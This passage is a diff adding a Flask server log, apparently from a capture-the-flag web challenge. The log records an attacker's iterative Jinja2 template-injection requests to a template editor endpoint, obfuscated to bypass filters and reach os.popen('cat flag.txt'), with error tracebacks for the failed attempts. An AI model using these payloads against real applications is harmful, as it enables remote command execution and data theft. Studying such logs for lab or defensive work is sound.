@@ -1,0 +1,149 @@
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5005
+ * Running on http://10.32.65.61:5005
+Press CTRL+C to quit
+127.0.0.1 - - [17/Dec/2025 10:39:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:39:34] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:39:34] "GET /admin HTTP/1.1" 200 -
+[2025-12-17 10:39:34,832] ERROR in app: Exception on /admin_area/template_editor.php [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/app.py", line 163, in template_editor
+    return render_template_string(template)
+  File "/usr/lib/python3/dist-packages/flask/templating.py", line 162, in render_template_string
+    return _render(app, template, context)
+  File "/usr/lib/python3/dist-packages/flask/templating.py", line 131, in _render
+    rv = template.render(context)
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 1295, in render
+    self.environment.handle_exception()
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 942, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "<template>", line 2, in top-level template code
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/templates/under_construction.html", line 1, in top-level template code
+    {% extends "base.html" %}
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/templates/base.html", line 72, in top-level template code
+    {% block content %}{% endblock %}
+    ^^^^^^^^^^^^^
+  File "<template>", line 23, in block 'content'
+  File "/usr/lib/python3/dist-packages/jinja2/utils.py", line 95, in from_obj
+    if hasattr(obj, "jinja_pass_arg"):
+       ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
+jinja2.exceptions.UndefinedError: 'jinja2.runtime.Undefined object' has no attribute '__import__'
+127.0.0.1 - - [17/Dec/2025 10:39:34] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"globals"~"_"*2)|attr("_"*2~"builtins"~"_"*2)|attr("_"*2~"imp"~"ort"~"_"*2)("os")|attr("po"~"pen")("cat+flag.txt")|attr("read")()+}} HTTP/1.1" 500 -
+127.0.0.1 - - [17/Dec/2025 10:39:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:39:46] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:39:46] "GET /admin HTTP/1.1" 200 -
+[2025-12-17 10:39:46,448] ERROR in app: Exception on /admin_area/template_editor.php [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/app.py", line 163, in template_editor
+    return render_template_string(template)
+  File "/usr/lib/python3/dist-packages/flask/templating.py", line 162, in render_template_string
+    return _render(app, template, context)
+  File "/usr/lib/python3/dist-packages/flask/templating.py", line 131, in _render
+    rv = template.render(context)
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 1295, in render
+    self.environment.handle_exception()
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 942, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "<template>", line 2, in top-level template code
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/templates/under_construction.html", line 1, in top-level template code
+    {% extends "base.html" %}
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/templates/base.html", line 72, in top-level template code
+    {% block content %}{% endblock %}
+    ^^^^^^^^^^^^^
+  File "<template>", line 23, in block 'content'
+  File "/usr/lib/python3/dist-packages/jinja2/utils.py", line 95, in from_obj
+    if hasattr(obj, "jinja_pass_arg"):
+       ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
+jinja2.exceptions.UndefinedError: 'jinja2.runtime.Undefined object' has no attribute '__import__'
+127.0.0.1 - - [17/Dec/2025 10:39:46] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"globals"~"_"*2)|attr("_"*2~"builtins"~"_"*2)|attr("_"*2~"imp"~"ort"~"_"*2)("os")|attr("po"~"pen")("cat+flag.txt")|attr("read")()+}} HTTP/1.1" 500 -
+127.0.0.1 - - [17/Dec/2025 10:40:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:16] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:40:16] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:16] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"globals"~"_"*2)|attr("_"*2~"builtins"~"_"*2)+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:39] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:40:39] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:39] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"globals"~"_"*2)|attr("_"*2~"builtins"~"_"*2)+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:59] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:40:59] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:40:59] "GET /admin_area/template_editor.php?search={{+7*7+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:19] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:41:19] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:19] "GET /admin_area/template_editor.php?search={{+url_for+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:40] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:40] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:41:40] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:41:40] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"func"~"_"*2)+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:42:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:42:03] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:42:03] "GET /admin HTTP/1.1" 200 -
+[2025-12-17 10:42:03,434] ERROR in app: Exception on /admin_area/template_editor.php [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "/home/akvnn/Downloads/l3mon_git/Akash-challs/l3mon_web_cve/app.py", line 163, in template_editor
+    return render_template_string(template)
+  File "/usr/lib/python3/dist-packages/flask/templating.py", line 161, in render_template_string
+    template = app.jinja_env.from_string(source)
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 1111, in from_string
+    return cls.from_code(self, self.compile(source), gs, None)
+                               ~~~~~~~~~~~~^^^^^^^^
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 771, in compile
+    self.handle_exception(source=source_hint)
+    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 942, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "<unknown>", line 23, in template
+jinja2.exceptions.TemplateSyntaxError: expected token 'end of print statement', got '['
+127.0.0.1 - - [17/Dec/2025 10:42:03] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"func"~"_"*2)|attr("_"*2~"globals"~"_"*2)["_"*2~"builtins"~"_"*2]["_"*2~"imp"~"ort"~"_"*2]("os")|attr("po"~"pen")("cat+flag.txt")|attr("read")()+}} HTTP/1.1" 500 -
+127.0.0.1 - - [17/Dec/2025 10:42:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:42:33] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:42:33] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:42:33] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"func"~"_"*2)|attr("_"*2~"globals"~"_"*2)|attr("get")("_"*2~"builtins"~"_"*2)+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:43:01] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:43:01] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:43:01] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:43:01] "GET /admin_area/template_editor.php?search={{+url_for|attr("_"*2~"func"~"_"*2)|attr("_"*2~"globals"~"_"*2)|attr("get")("_"*2~"builtins"~"_"*2)|attr("get")("_"*2~"imp"~"ort"~"_"*2)("os")|attr("po"~"pen")("cat+flag.txt")|attr("read")()+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:47:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:47:25] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:47:25] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:47:25] "GET /admin_area/template_editor.php?search={{+request['\\x5f\\x5fclass\\x5f\\x5f']+}}{{+request['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fmro\\x5f\\x5f'][-1]['\\x5f\\x5fsubclasses\\x5f\\x5f']()+}} HTTP/1.1" 403 -
+127.0.0.1 - - [17/Dec/2025 10:48:00] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:48:00] "POST /admin/login HTTP/1.1" 302 -
+127.0.0.1 - - [17/Dec/2025 10:48:00] "GET /admin HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 10:48:00] "GET /admin_area/template_editor.php?search={{+request['foo']+}} HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 11:16:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 11:16:40] "GET /static/style.css HTTP/1.1" 200 -
+127.0.0.1 - - [17/Dec/2025 11:16:44] "GET /favicon.ico HTTP/1.1" 404 -
